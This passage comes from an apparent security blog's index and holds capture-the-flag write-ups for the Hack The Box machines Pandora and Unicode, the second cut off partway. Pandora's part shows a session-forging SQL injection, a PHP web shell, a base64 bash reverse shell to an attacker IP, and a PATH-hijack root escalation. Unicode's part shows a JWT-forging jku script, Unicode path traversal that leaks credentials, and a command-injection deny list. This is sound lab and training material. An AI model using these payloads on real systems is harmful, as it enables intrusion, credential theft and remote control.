fqd96rcv4ecuqs409n5qsleufi | NULL | 1638786762 | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:\"daniel\"; | 1638783230 | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0; | 1638796349 | | gf40pukfdinc63nm5lkroidde6 | NULL | 1638786349 | | gn6g2mp11dba8ij2rsi1fq9l61 | NULL | 1653964201 | | heasjj8c48ikjlvsf1uhonfesv | NULL | 1638540345 | | hoasg65m5n6lh9vjthb4ub1tm6 | NULL | 1653964104 | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:\"daniel\"; | 1638168492 | | imehjf0deppr112i03a12t4v4b | id_usuario|s:6:\"daniel\"; | 1653963989 | | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:\"daniel\"; | 1638456173 | | kp90bu1mlclbaenaljem590ik3 | NULL | 1638787808 | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | 1638796348 | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:\"daniel\"; | 1638540482 | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:\"daniel\"; | 1637667827 | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:\"daniel\"; | 1638168416 | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | 1638787723 | | r097jr6k9s7k166vkvaj17na1u | NULL | 1638787677 | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:\"daniel\"; | 1638889082 | | tim898ul2ljiqgcmcnbnc54knl | NULL | 1653964084 | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:\"daniel\"; | 1638547193 | | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:\"daniel\"; | 1638793297 | | uk1r72on9hmlvbo9k49k6be3vo | NULL | 1653964098 | +----------------------------+-----------------------------------------------------+-------------+ ...  We have all active sessions in the server. Notice there is one that belongs to matt: g4e01qdgk36mfdh90hvcc54umq. If we modify the PHPSESSID cookie in the browser by this value and reload the page, we will enter into matt\u0026rsquo;s session:\nLateral movement to user matt But we are not administrator\u0026hellip; In order to access as administrator we must use this SQLi payload:\nsession_id=' union select 1,2,'id_usuario|s:5:\"admin\";'-- -  This payload will set us an admin session automatically because chart_generator.php is also vulnerable to insecure PHAR deserialization:\n$ curl -siG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2,'id_usuario|s:5:\\\"admin\\\";'-- -\" | grep PHPSESSID Set-Cookie: PHPSESSID=t365p1tcdkbv3vva23q2j79rso; path=/  We take the session cookie and put it again in the browser. Now we are admin:\nAt this point, we can upload a PHP file (r.php) to gain Remote Code Execution (RCE) on the server as matt:\n\u0026lt;?php system($_GET['c']); ?\u0026gt;  Now we can search the file r.php and gain a reverse shell as matt:\ndaniel@pandora:~$ find /var/www -name r.php 2/dev/null /var/www/pandora/pandora_console/images/r.php  $ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 'localhost:8000/pandora_console/images/r.php?c=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.136. Ncat: Connection from 10.10.11.136:35298. bash: cannot set terminal process group (888): Inappropriate ioctl for device bash: no job control in this shell matt@pandora:/var/www/pandora/pandora_console/images$ cd / cd / matt@pandora:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null matt@pandora:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm matt@pandora:/$ export TERM=xterm matt@pandora:/$ export SHELL=bash matt@pandora:/$ stty rows 50 columns 158  Privilege escalation At this point, we can analyze that /usr/bin/pandora_backup is doing (SUID binary):\nmatt@pandora:/home/matt$ ltrace /usr/bin/pandora_backup getuid() = 1000 geteuid() = 1000 setreuid(1000, 1000) = 0 puts(\"PandoraFMS Backup Utility\"PandoraFMS Backup Utility ) = 26 puts(\"Now attempting to backup Pandora\"...Now attempting to backup PandoraFMS client ) = 43 system(\"tar -cvf /root/.backup/pandora-b\"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied tar: Error is not recoverable: exiting now \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 512 puts(\"Backup failed!\\nCheck your permis\"...Backup failed! Check your permissions! ) = 39 +++ exited (status 1) +++  We see that it uses tar without an absolute path, so it is vulnerable to PATH hijacking. Let\u0026rsquo;s perform the attack:\nmatt@pandora:/$ cd /tmp matt@pandora:/tmp$ cat  tar #!/bin/bash chmod 4755 /bin/bash ^C matt@pandora:/tmp$ chmod +x tar matt@pandora:/tmp$ which tar /usr/bin/tar matt@pandora:/tmp$ export PATH=/tmp:$PATH matt@pandora:/tmp$ which tar /tmp/tar  At this point, tar will be executed as /tmp/tar so that /bin/bash will be set to SUID as well:\nmatt@pandora:/tmp$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client chmod: changing permissions of '/bin/bash': Operation not permitted Backup failed! Check your permissions! matt@pandora:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  But for some reason, the attack is not working. Let\u0026rsquo;s try to access via SSH. This can be done using SSH keys:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:7aEfZ2kv6cZXqHKtyYKPtuPW7CTkAl4OqLYkkXd9ehY The key's randomart image is: +---[RSA 3072]----+ | | | | | | | . . . . | |o o + o E o . | | + o = = + . .. .| |oo . + *++.=+ . | |+ . +===*Boo | | . ++=+*=+. | +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=  matt@pandora:/tmp$ cd /home/matt matt@pandora:/tmp$ ls -la total 24 drwxr-xr-x 2 matt matt 4096 Dec 7 15:00 . drwxr-xr-x 4 root root 4096 Dec 7 14:32 .. lrwxrwxrwx 1 matt matt 9 Jun 11 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 matt matt 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 matt matt 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 matt matt 807 Feb 25 2020 .profile -rw-r----- 1 root matt 33 May 31 02:26 user.txt matt@pandora:/home/matt$ mkdir .ssh matt@pandora:/home/matt$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7J5RU3r/Dohol6WM7YjW5SAhGyGsD9yALiXIe7CJr7l5ZhQbhw7JOGKZQxPVQpRNa3eCTu632VcqJ6Rnrn/7FOQbAyeKko1BdJwlTlrxaNSo+WyT0pjuCIFFV88kHDqwZ6OpaIIZhIkHjH35ZPfhGQJJ2WMidVM3mcx9384j2XNI2zo8R1l7jIC4dKLHUifM2jt4Yxr2JyuBJgOlAdre57mI63PKJkbUz3wtAYLabs3BYtcXHEGj1OGGWwf+PsyatCdhMu72ZlwZQRs4RVPw26hhiwrdRDVyreJ3ceK8k1yDf9kHwqNOA8qa82oDdXLJWjfBxvQwgJTSeFqtmdpio5yXfGoSKU1Eji/y1XA8Nx1TfT23xHaCIX8VWYtPJ75GvbTr8fXxqgq/qIqQy9xVwwl2KJ3df/5vobh4vYsU6O9lsGROSpkMG5tQ3W9dkWjAccWHzvXHrcot+k0KxaLZpY+DxmnxInlkum6pwjDRXyNPsCooikIiSTD7pJjj94k=' \u0026gt;\u0026gt; .ssh/authorized_keys  $ ssh -i id_rsa matt@10.10.11.136 matt@pandora:~$ cat user.txt 9a360fbf015ce0c7b2c73fd1ac3baa19  Ok, let\u0026rsquo;s repeat the attack:\nmatt@pandora:~$ cd /tmp matt@pandora:/tmp$ cat  tar #!/bin/bash chmod 4755 /bin/bash ^C matt@pandora:/tmp$ chmod +x tar matt@pandora:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin matt@pandora:/tmp$ which tar /usr/bin/tar matt@pandora:/tmp$ export PATH=/tmp:$PATH matt@pandora:/tmp$ which tar /tmp/tar matt@pandora:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash matt@pandora:/tmp$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client Backup successful! Terminating program! matt@pandora:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  It worked! Here we have the root.txt flag:\nmatt@pandora:/tmp$ bash -p bash-5.0# cat /root/root.txt a05061c0477ab2ca820a0e4bdf6d8002  ","image":"/images/HTB/Pandora/Pandora.png","permalink":"https://7rocky.github.io/en/htb/pandora/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine exposes sensitive information through SNMP that allows to access the machine. Then we find a local instance of Pandora FMS that has multiple vulnerabilities and they can be exploited to gain RCE as another user. This user is allowed to run a SUID binary that is vulnerable to PATH hijacking, but the attack needs to be performed with an SSH shell. Basic enumeration and pentesting skills are needed in order to compromise this machine","time":15,"title":"Pandora"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.126   Release: 27 / 11 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.126 -p 22,80 Nmap scan report for 10.10.11.126 Host is up (0.057s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: 503 |_http-trane-info: Problem with XML parsing of /evox/about |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.126 we will see a page like this:\nWe notice that there is a redirect feature (the button that says \u0026ldquo;Google about us\u0026rdquo;):\nWe can also register a new account going to /register/:\nThen we can log in going to /login/ and access our dashboard in /dashboard/.\nIf we try to register an account as admin, we will see that this user already exists:\nIf we examine the cookie set by the server, we see that it is a JWT token. The contents of this token can be easily shown in jwt.io:\nHere we have a weird JWT claim (that is, a key-value pair in the header section). The key jku is not a common one. We see the domain hackmedia.htb, so we can add it to /etc/hosts pointing to 10.10.11.126.\nNow, we can request http://hackmedia.htb/static/jwks.json:\n$ curl -s hackmedia.htb/static/jwks.json | jq { \"keys\": [ { \"kty\": \"RSA\", \"use\": \"sig\", \"kid\": \"hackthebox\", \"alg\": \"RS256\", \"n\": \"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\", \"e\": \"AQAB\" } ] }  This is a JSON Web Key Set (JWKS). It is used to store the RSA public key that verifies a JWT token, because the token was signed with the corresponding RSA private key when it was created.\nForging a JWT token The idea is simple, first we create RSA private and public keys. Then, we can generate a JWKS with the public key and expose it using a web server. After that, we can forge a JWT token using admin as user and a jku value that points to our JWKS and sign the token with our private key.\nFinally, the victim machine will receive the forged JWT and to verify it, the server will take our JWKS and do the verification successfully.\nFor that purpose, we can make use of a Python script like this one:\n#!/usr/bin/env python3 import base64 import json import jwt import sys from Crypto.PublicKey import RSA from Crypto.Util.number import long_to_bytes from http.server import HTTPServer, SimpleHTTPRequestHandler privkey = open('priv.key').read() pubkey = RSA.import_key(open('pub.key').read()) def int_to_b64(x: str | int) -\u0026gt; str: return base64.urlsafe_b64encode(long_to_bytes(int(x))).decode() def generate_jwks(): json.dump({'keys': [{ 'kty': 'RSA', 'kid': 'hackthebox', 'use': 'sig', 'alg': 'RS256', 'e': int_to_b64(pubkey.e), 'n': int_to_b64(pubkey.n) }]}, open('jwks.json', 'w'), indent=2) def main(): generate_jwks() ip = sys.argv[1] jku = f'http://{ip}/jwks.json' token = jwt.encode({'user': 'asdf'}, privkey, algorithm='RS256', headers={'jku': jku}) print('[+] JWT token:', token) HTTPServer(('', 80), SimpleHTTPRequestHandler).serve_forever() if __name__ == '__main__': main()  Before running the script, we need to generate RSA private and public keys. We can use openssl for that:\n$ openssl genrsa -out priv.key 1024 Generating RSA private key, 1024 bit long modulus .........................................................................................................................++++++ ...++++++ e is 65537 (0x10001) $ openssl rsa -in priv.key -pubout \u0026gt; pub.key writing RSA key  To generate the JWKS, we have to extract n and e from the public key (this is done in Python with Crypto.PublicKey.RSA) and then encode them in Base64. Then, these values and other data are stored into a JSON file called jwks.json.\nThen we generate the forged JWT using the RSA private key and putting the URL to jwks.json as jku in the header.\nIf we run the script, we will see the JWT token and a web server will be started to serve jwks.json:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  Then, we can use curl to check if the JWT token is valid:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNy40NC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.ba9qYIw2E8ynYq1OPnZ4gDoSOtxpFZMivvgr8YqN7AXuPE1kw4mpEwYoNyPvoH3dAcnVRjkzytaQGvtYuYT8oXHZMrlZ3uN0p76e86p5Crr4tyYk1D4o8GT0KpCY6ABlcxChxonLGH5S3GqqnJ2wqrojoeThJ-CDrJFQM2ggSWI' jku validation failed  And the server says that the jku field is invalid. Moreover, we do not receive any requests on the Python server output. The machine must have applied some filtering.\nHere we can recall that there was a redirect feature in the website. If the machine is only allowing jku that start with http://hackmedia.htb, then it can be easily bypassed using the redirect feature (Open Redirect). We can change the jku value in the Python script as follows:\n+ jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json' - jku = f'http://{ip}/jwks.json'  We run the script again:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM  And check the JWT token:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3JlZGlyZWN0Lz91cmw9MTAuMTAuMTcuNDQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.cWE5m9Vb9f7PoReY7XjyfRhU-Jrv23yw8C3uum8mVezJCFPeLEBbf030EXrprcGjZjzH4x_I8P9v7NNjAHiVG8bm0JG7BEyE4wjUhtNVTnoiaHnpmbIxvZkZ4UIVmdO4rvVOQYCjIgD4gcoMi2dWF6Az1EbKI1pqJKZypxU4MwM' jku validation failed  It is still invalid (and no request received). Let\u0026rsquo;s compare the legitimate value for the jku and the one we are using:\n http://hackmedia.htb/static/jwks.json: Valid http://hackmedia.htb/redirect/?url=10.10.17.44/jwks.json: Invalid  There is another chance, and that is using directory traversal to have the jku starting with http://hackmedia.htb/static/ and be able to access /redirect/. Namely, we must try:\n http://hackmedia.htb/static/jwks.json: Valid http://hackmedia.htb/static/../redirect/?url=10.10.17.44/jwks.json: To try  So, let\u0026rsquo;s change the jku in the Python script again:\n+ jku = f'http://hackmedia.htb/static/../redirect?url={ip}/jwks.json' - jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'  And then run the script:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  This time there is no error message:\n$ curl hackmedia.htb/dashboard/ -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s' \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;/html\u0026gt;  So we have a valid forged JWT token. Moreover, there is a request on our server log:\n$ python3 jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s 10.10.11.126 - - [] \"GET /jwks.json HTTP/1.1\" 200 -  Now we can create a forged JWT token for user admin. This will bring us to a different dashboard:\nNotice that the Python server must be running to serve the jwks.json, so that the machine can retrieve it every time it needs to validate the JWT token.\nExploiting a Directory Path Traversal On this dashboard, we can see a feature to get some PDF files (although it seems to be not finished):\nValid files are: monthly.pdf and quarterly.pdf.\nAt this point we can try a common Directory Path Traversal payload and check if the server is vulnerable (namely, multiple ../ and then a file such as /etc/passwd):\nAs it can be seen, the server blocks our request. It also says that it applies some filters, challenging us to bypass them.\nAfter trying some payloads from HackTricks and PayloadsAllTheThings without any interesting result, we can think of UTF-8 characters (since the machine is called Unicode).\nActually, there is a bypassing technique for Flask that uses a single Unicode character that looks similar to .. or / (for example: ‥, ︰ or ／), and Flask parses them as two dots and a slash. More information here.\nWe can check easily if the server is running Flask by looking at the HTTP response status message. If the message is in capital letters, it is likely to be a Flask application:\n$ curl hackmedia.htb -I HTTP/1.1 308 PERMANENT REDIRECT Server: nginx/1.18.0 (Ubuntu) Date: Content-Type: text/html; charset=utf-8 Content-Length: 260 Connection: keep-alive Location: http://hackmedia.htb/login/  Now that we know it is a Flask application, we can use the Unicode characters shown above to get /etc/passwd:\nThe website is vulnerable to Directory Path Traversal. I decided to add this exploit to the previous Python script (using Unicode characters). The script is dpt-jwks.py (detailed explanation here).\nUsing this script, we can read files from the server in an easy way:\n$ python3 dpt-jwks.py 10.10.17.44 [+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s [+] Vulnerable page: http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd dpt\u0026gt; /etc/hosts 127.0.0.1 localhost 127.0.1.1 code 127.0.0.1 hackmedia.htb # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters  As the server has an nginx (shown in the output of nmap), we an try to read the sites configuration:\ndpt\u0026gt; /etc/nginx/sites-enabled/default  limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s; server{ # Change the Webroot from /home/code/app/ to /var/www/html/ # Change the user password from db.yaml listen 80; error_page 503 /rate-limited/; location / { limit_req zone=mylimit; proxy_pass http://localhost:8000; include /etc/nginx/proxy_params; proxy_redirect off; } location /static/ { alias /home/code/coder/static/styles/; } }  Here we see some interesting things:\n \u0026ldquo;Change the Webroot from /home/code/app/ to /var/www/html/\u0026rdquo; \u0026ldquo;Change the user password from db.yaml\u0026rdquo;  We need to find the absolute path to file db.yaml because it may contain clear text credentials. Using these information, we can try the following paths:\n /home/code/db.yaml /home/code/app/db.yaml /var/www/html/db.yaml /home/code/coder/static/styles/db.yaml /home/code/coder/static/db.yaml /home/code/coder/db.yaml  And the last one is the valid one:\ndpt\u0026gt; /home/code/coder/db.yaml  mysql_host: \"localhost\" mysql_user: \"code\" mysql_password: \"B3stC0d3r2021@@!\" mysql_db: \"user\"  Actually, we can also get the user.txt flag:\ndpt\u0026gt; /home/code/user.txt eb2b21ad20f6b9239746d35881f4e023  System enumeration The password found inside the file db.yaml is reused for SSH:\n$ ssh code@10.10.11.126 code@10.10.11.126's password: code@code:~$  User code is able to use sudo to run /usr/bin/treport as root without password (although we have it):\ncode@code:~$ sudo -l Matching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User code may run the following commands on code: (root) NOPASSWD: /usr/bin/treport  This file is a compiled binary:\ncode@code:~$ file /usr/bin/treport /usr/bin/treport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f6af5bc244c001328c174a6abf855d682aa7401b, for GNU/Linux 2.6.32, stripped  The program allows to create, read and download threat reports:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:  If we interact with the program and force an exit (^C), we will see a KeyboardInterrupt:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:^CTraceback (most recent call last): File \"treport.py\", line 67, in \u0026lt;module\u0026gt; KeyboardInterrupt [2177] Failed to execute script 'treport' due to unhandled exception!  This is a common exception in Python scripts. This tells us that treport is a Python compiled binary. Moreover, there is a reference to a file called treport.py.\nReversing treport to Python code To transfer the treport binary to our attacker machine, one could open a web server on the victim machine using Python and request the binary file using wget or curl.\nTo extract the byte-code (.pyc), we can use PyInstaller Extractor. Then, with the byte-code, we can obtain the original Python script using uncompyle6 (pip3 install uncompyle6).\nThese tools require Python version 3.8. To avoid issues, this task can be done inside a Docker container:\n$ wget -q https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py $ docker run --rm -v \"$PWD\"/:/htb -it python:3.8 bash root@28075f8d8030:/# cd htb root@28075f8d8030:/htb# pip3 install uncompyle6 ... root@28075f8d8030:/htb# python3 pyinstxtractor.py treport [+] Processing treport [+] Pyinstaller version: 2.1+ [+] Python version: 38 [+] Length of package: 6798297 bytes [+] Found 46 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_multiprocessing.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: treport.pyc [+] Found 223 files in PYZ archive [+] Successfully extracted pyinstaller archive: treport You can now use a python decompiler on the pyc files within the extracted directory root@28075f8d8030:/htb# uncompyle6 treport_extracted/treport.pyc \u0026gt; treport.py  Now we are able to read the Python source code and analyze it:\nimport os, re, sys from datetime import datetime class threat_report: def create(self): file_name = input('Enter the filename:') content = input('Enter the report:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) file_path = '/root/reports/' + file_name with open(file_path, 'w') as (fd): fd.write(content) def list_files(self): file_list = os.listdir('/root/reports/') files_in_dir = ' '.join([str(elem) for elem in file_list]) print('ALL THE THREAT REPORTS:') print(files_in_dir) def read_file(self): file_name = input('\\nEnter the filename:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) contents = '' file_name = '/root/reports/' + file_name try: with open(file_name, 'r') as (fd): contents = fd.read() except: print('SOMETHING IS WRONG') else: print(contents) def download(self): now = datetime.now() current_time = now.strftime('%H_%M_%S') command_injection_list = ['`', ';', '\u0026amp;', '|', '\u0026gt;', '\u0026lt;', '?', \"'\", '@', '#', '$', '%', '^', '(', ')'] ip = input('Enter the IP/file_name:') res = bool(re.search('\\\\s', ip)) if res: print('INVALID IP') sys.exit(0) if 'file' in ip or 'gopher' in ip or 'mysql' in ip: print('INVALID URL') sys.exit(0) for vars in command_injection_list: if vars in ip: print('NOT ALLOWED') sys.exit(0) cmd = '/bin/bash -c \"curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '\"' os.system(cmd) if __name__ == '__main__': obj = threat_report() print('1.Create Threat Report.') print('2.Read Threat Report.') print('3.Download A Threat Report.') print('4.Quit.') check = True if check: choice = input('Enter your choice:') try: choice = int(choice) except: print('Wrong Input') sys.exit(0) else: if choice == 1: obj.create() elif choice == 2: obj.list_files() obj.read_file() elif choice == 3: obj.download() elif choice == 4: check = False else: print('Wrong input.')  If we read the four existing methods:\n list_files does not seem to be vulnerable read_file appears to have a good filter for ../ create also appears to have a good filter for ../ download has a list of bad characters, but also a system command with user input being concatenated  Clearly, the most vulnerable method is download. Let\u0026rsquo;s take a look to the bad characters:\n['`', ';', '\u0026amp;', '|', '\u0026gt;', '\u0026lt;', '?', 